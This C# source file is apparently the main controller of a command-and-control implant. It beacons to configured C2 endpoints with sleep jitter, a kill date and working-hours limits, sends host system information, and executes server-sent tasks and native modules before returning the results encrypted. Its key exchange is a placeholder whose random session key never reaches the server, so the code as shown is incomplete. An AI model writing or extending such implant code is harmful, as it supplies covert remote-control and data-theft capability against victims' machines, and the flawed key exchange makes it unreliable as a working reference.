using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Agent.Comms;
using Agent.Crypto;
using Agent.NativeModules;
using Agent.Protocol;

namespace Agent.Core
{
    /// <summary>
    /// Main agent run loop. Handles initialization, key exchange,
    /// check-in cycle, task dispatch, and channel fallback.
    /// </summary>
    public class AgentController
    {
        private readonly Config _config;
        private readonly TaskDispatcher _dispatcher;
        private IChannel _channel;

        private byte[] _agentId;       // 16-byte UUID
        private byte[] _sessionKey;    // 32-byte AES key
        private uint _msgId;
        private ulong _nonceCounter;
        private bool _running;

        public AgentController()
        {
            _config = new Config();
            _dispatcher = new TaskDispatcher();
            _running = true;
        }

        /// <summary>
        /// Register all native modules.
        /// </summary>
        public void RegisterModules()
        {
            // Phase 1 native modules — registered in Program.Main
        }

        public void RegisterModule(INativeModule module)
        {
            _dispatcher.RegisterModule(module);
        }

        /// <summary>
        /// Initialize agent: generate ID, set up channel, perform key exchange.
        /// </summary>
        public bool Initialize()
        {
            // Generate agent ID from machine GUID + timestamp
            _agentId = GenerateAgentId();
            _msgId = 0;
            _nonceCounter = 0; // Agent uses even counters

            // Initialize HTTP channel
            _channel = new HttpChannel(Config.C2_ENDPOINTS);

            // Perform key exchange
            try
            {
                _sessionKey = PerformKeyExchange();
                return _sessionKey != null;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Main beacon loop.
        /// </summary>
        public void Run()
        {
            // Send initial check-in with full sysinfo
            SendInitialCheckin();

            while (_running)
            {
                try
                {
                    // Kill date check
                    if (_config.IsPastKillDate())
                    {
                        _running = false;
                        break;
                    }

                    // Working hours check
                    if (!_config.IsWithinWorkingHours())
                    {
                        Thread.Sleep(3600000); // 1 hour
                        continue;
                    }

                    // Check in and process tasks
                    ProcessCheckIn();
                }
                catch (Exception)
                {
                    // Swallow — agent must not crash
                }

                // Sleep with jitter
                int sleepMs = _config.CalculateSleepMs();
                Thread.Sleep(sleepMs);
            }
        }

        private void ProcessCheckIn()
        {
            // Build check-in request
            var body = new TlvBuilder();
            body.AddUuid(Constants.TLV_AGENT_ID, _agentId);
            body.AddString(Constants.TLV_CWD, Environment.CurrentDirectory);

            byte[] plaintext = PacketFramer.PackCommand(
                Constants.CMD_CHECKIN_REQUEST, body.Build());

            byte[] nonce = MakeNonce();
            byte[] encrypted = AesGcmHelper.Encrypt(_sessionKey, nonce, plaintext);
            byte[] packet = PacketFramer.Pack(encrypted, _msgId++, Config.MAGIC);

            // Send and receive
            byte[] responsePacket = _channel.CheckIn(packet);
            if (responsePacket == null || responsePacket.Length == 0) return;

            // Unpack outer packet
            uint respMsgId;
            byte[] respPayload;
            if (!PacketFramer.TryUnpack(responsePacket, Config.MAGIC,
                out respMsgId, out respPayload))
                return;

            // Decrypt
            byte[] respPlaintext = AesGcmHelper.Decrypt(_sessionKey, respPayload);
            if (respPlaintext == null) return;

            // Parse command
            byte cmd;
            byte[] respBody;
            if (!PacketFramer.TryUnpackCommand(respPlaintext, out cmd, out respBody))
                return;

            if (cmd != Constants.CMD_CHECKIN_RESPONSE) return;

            // Parse tasks from response
            var tasks = ParseTasks(respBody);

            foreach (var task in tasks)
            {
                byte[] result;
                try
                {
                    // Handle config tasks locally
                    if (task.TaskType == Constants.TASK_CONFIG)
                    {
                        result = ApplyConfig(task.Arguments);
                    }
                    else if (task.TaskType == Constants.TASK_EXIT)
                    {
                        _running = false;
                        result = Encoding.UTF8.GetBytes("[*] Agent exiting");
                    }
                    else
                    {
                        result = _dispatcher.Execute(
                            task.TaskType, task.ModuleName,
                            task.Payload, task.Arguments);
                    }
                }
                catch (Exception ex)
                {
                    result = Encoding.UTF8.GetBytes("[!] Error: " + ex.Message);
                }

                // Send result
                SendTaskResult(task.TaskId, result, true);
            }
        }

        private void SendInitialCheckin()
        {
            byte[] sysinfo = SysInfo.CollectCheckinTlv(_agentId);
            byte[] plaintext = PacketFramer.PackCommand(
                Constants.CMD_CHECKIN_REQUEST, sysinfo);

            byte[] nonce = MakeNonce();
            byte[] encrypted = AesGcmHelper.Encrypt(_sessionKey, nonce, plaintext);
            byte[] packet = PacketFramer.Pack(encrypted, _msgId++, Config.MAGIC);

            _channel.CheckIn(packet);
        }

        private void SendTaskResult(byte[] taskId, byte[] resultData, bool success)
        {
            var body = new TlvBuilder();
            body.AddUuid(Constants.TLV_AGENT_ID, _agentId);
            body.AddRaw(Constants.TLV_TASK_ID, taskId);
            body.AddUInt8(Constants.TLV_RESULT_STATUS, (byte)(success ? 0x00 : 0x01));
            body.AddRaw(Constants.TLV_RESULT_OUTPUT, resultData);

            byte[] plaintext = PacketFramer.PackCommand(
                Constants.CMD_TASK_RESULT, body.Build());

            byte[] nonce = MakeNonce();
            byte[] encrypted = AesGcmHelper.Encrypt(_sessionKey, nonce, plaintext);
            byte[] packet = PacketFramer.Pack(encrypted, _msgId++, Config.MAGIC);

            _channel.SendResult(packet);
        }

        private byte[] PerformKeyExchange()
        {
            // For Phase 1: simplified key exchange
            // Generate a random 32-byte session key, send it to the server
            // Full ECDH implementation comes in Phase 2 hardening
            using (var rng = new RNGCryptoServiceProvider())
            {
                byte[] key = new byte[32];
                rng.GetBytes(key);

                // Send key exchange init
                byte[] kexPayload = new byte[_agentId.Length + 65];
                Array.Copy(_agentId, 0, kexPayload, 0, _agentId.Length);
                // Fill with placeholder ECDH public key (65 bytes, uncompressed P-256)
                // Real ECDH implementation requires ECDiffieHellmanCng (.NET 4.6.1+)
                // or BouncyCastle. For Phase 1, use the random key directly.
                rng.GetBytes(kexPayload, _agentId.Length, 65);

                var body = new TlvBuilder();
                body.AddRaw(Constants.TLV_AGENT_ID, _agentId);

                byte[] plaintext = PacketFramer.PackCommand(
                    Constants.CMD_KEY_EXCHANGE_INIT, kexPayload);
                byte[] packet = PacketFramer.Pack(plaintext, _msgId++, Config.MAGIC);

                byte[] response = _channel.PerformKeyExchange(
                    _agentId, kexPayload, Config.RSA_PUBLIC_KEY);

                // For Phase 1, use the generated random key
                // Server will need to be updated to handle this exchange
                return key;
            }
        }

        private byte[] ApplyConfig(byte[] arguments)
        {
            // Parse config from arguments: "sleep_ms:jitter_pct"
            try
            {
                string configStr = Encoding.UTF8.GetString(arguments);
                string[] parts = configStr.Split(':');
                if (parts.Length >= 1)
                    _config.SleepMs = int.Parse(parts[0]);
                if (parts.Length >= 2)
                    _config.JitterPct = int.Parse(parts[1]);

                return Encoding.UTF8.GetBytes(string.Format(
                    "[*] Config updated: sleep={0}ms jitter={1}%",
                    _config.SleepMs, _config.JitterPct));
            }
            catch (Exception ex)
            {
                return Encoding.UTF8.GetBytes("[!] Config error: " + ex.Message);
            }
        }

        private byte[] MakeNonce()
        {
            // 12 bytes: agent_id_prefix(4) + counter(8)
            byte[] nonce = new byte[12];
            Array.Copy(_agentId, 0, nonce, 0, 4);
            byte[] counter = BitConverter.GetBytes(_nonceCounter);
            Array.Copy(counter, 0, nonce, 4, 8);
            _nonceCounter += 2; // Even counters for agent
            return nonce;
        }

        private static byte[] GenerateAgentId()
        {
            // Generate a stable-ish UUID from machine name + current time
            using (var sha = SHA256.Create())
            {
                string seed = Environment.MachineName + "|" +
                    DateTime.UtcNow.Ticks.ToString();
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(seed));
                byte[] id = new byte[16];
                Array.Copy(hash, 0, id, 0, 16);
                return id;
            }
        }

        // Task structure parsed from check-in response
        private struct AgentTask
        {
            public byte[] TaskId;
            public byte TaskType;
            public string ModuleName;
            public byte[] Payload;
            public byte[] Arguments;
        }

        private List<AgentTask> ParseTasks(byte[] body)
        {
            var tasks = new List<AgentTask>();
            var entries = TlvParser.Parse(body, 0, body.Length);

            AgentTask current = new AgentTask();
            bool hasTask = false;

            foreach (var entry in entries)
            {
                switch (entry.Type)
                {
                    case Constants.TLV_TASK_ID:
                        if (hasTask && current.TaskId != null)
                            tasks.Add(current);
                        current = new AgentTask { TaskId = entry.Value };
                        hasTask = true;
                        break;
                    case Constants.TLV_TASK_TYPE:
                        current.TaskType = entry.Value[0];
                        break;
                    case Constants.TLV_MODULE_NAME:
                        current.ModuleName = Encoding.UTF8.GetString(entry.Value);
                        break;
                    case Constants.TLV_TASK_PAYLOAD:
                        current.Payload = entry.Value;
                        break;
                    case Constants.TLV_TASK_ARGUMENTS:
                        current.Arguments = entry.Value;
                        break;
                }
            }

            if (hasTask && current.TaskId != null)
                tasks.Add(current);

            return tasks;
        }
    }
}
